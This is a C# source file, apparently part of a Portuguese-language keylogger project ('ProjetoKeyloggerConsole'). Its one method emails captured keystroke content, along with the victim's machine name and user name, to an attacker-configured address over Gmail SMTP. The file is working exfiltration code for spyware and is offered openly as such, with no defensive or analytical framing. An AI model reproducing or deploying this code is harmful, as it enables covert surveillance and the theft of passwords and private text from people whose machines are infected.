using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace ProjetoKeyloggerConsole.Entities
{
    internal class Email
    {
        public static void EnviarEmail(string conteudo)
        {
            MailMessage mail = new MailMessage();
            SmtpClient smtpserver = new SmtpClient("smtp.gmail.com");
            //Email
            mail.From = new MailAddress(Config.Email);
            //Receber 
            mail.To.Add(Config.Email);
            //Nome do email recebido 
            mail.Subject = ("Conteúdo Keylogger");
            //Conteudo 
            mail.Body = ("Nome da máquina: " + Environment.MachineName +
                         "\nNome do usuário: " + Environment.UserName +
                         "\nConteúdo do Keylogger: " + conteudo);
            smtpserver.Port = (587);
            smtpserver.Credentials = new System.Net.NetworkCredential(Config.Email, Config.Senha);
            smtpserver.EnableSsl = true;
            smtpserver.Send(mail);
        }
    }
}
